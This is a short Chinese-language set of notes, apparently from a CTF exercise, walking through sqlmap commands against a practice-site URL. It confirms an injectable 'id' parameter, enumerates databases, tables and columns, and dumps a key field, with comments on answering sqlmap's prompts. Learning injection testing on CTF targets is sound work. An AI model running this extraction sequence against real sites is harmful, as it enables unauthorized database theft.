python环境
python sqlmap.py
测试安装成功
python sqlmap.py -u "http://ctf5.shiyanbar.com/8/index.php?id=1"
//根据链接初步断定注入信息
python sqlmap.py -u "http://ctf5.shiyanbar.com/8/index.php?id=1" --dbs
//爆这个u网址的--库dbs
python sqlmap.py -u "http://ctf5.shiyanbar.com/8/index.php?id=1" --current-db
//或者看当前数据库
python sqlmap.py -u "http://ctf5.shiyanbar.com/8/index.php?id=1" -D my_db --tables
//爆这个u网址D数据库下的--表tables
python sqlmap.py -u "http://ctf5.shiyanbar.com/8/index.php?id=1" -D my_db -T thiskey --columns
//爆列信息--columns
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] n
//已经确定库，不用再测试其他库
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] y
//默认危险等级
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
//已经确定攻击点，不用再等待了
do you want to use common column existence check? [y/N/q] y
//有一些属性列字典了
python sqlmap.py -u "http://ctf5.shiyanbar.com/8/index.php?id=1" -D my_db -T thiskey -C k0y --dump
//爆破这个字段
python sqlmap.py --purge-output
//清理缓存
可以用-v
让sqlmap显示它执行的语句

